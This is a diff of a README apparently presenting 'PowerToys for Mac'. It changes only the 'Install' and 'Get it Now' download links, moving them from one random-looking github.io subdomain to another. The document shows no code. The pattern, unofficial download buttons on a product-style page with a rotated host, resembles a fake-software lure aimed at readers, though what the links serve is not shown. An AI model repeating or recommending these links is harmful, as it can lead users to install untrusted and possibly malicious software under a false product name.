@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://jjfhjfk3858.github.io/.github/powerToys)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://poke-pokemon.github.io/.github/powerToys)
 
 </div>
 
@@ -81,7 +81,7 @@ PowerToys for Mac occupies an interesting position — Microsoft bringing its Wi
 
 <p align="center">
 
-[![Get it Now PowerToys](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://jjfhjfk3858.github.io/.github/powerToys)
+[![Get it Now PowerToys](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://poke-pokemon.github.io/.github/powerToys)
 
 </p>
 
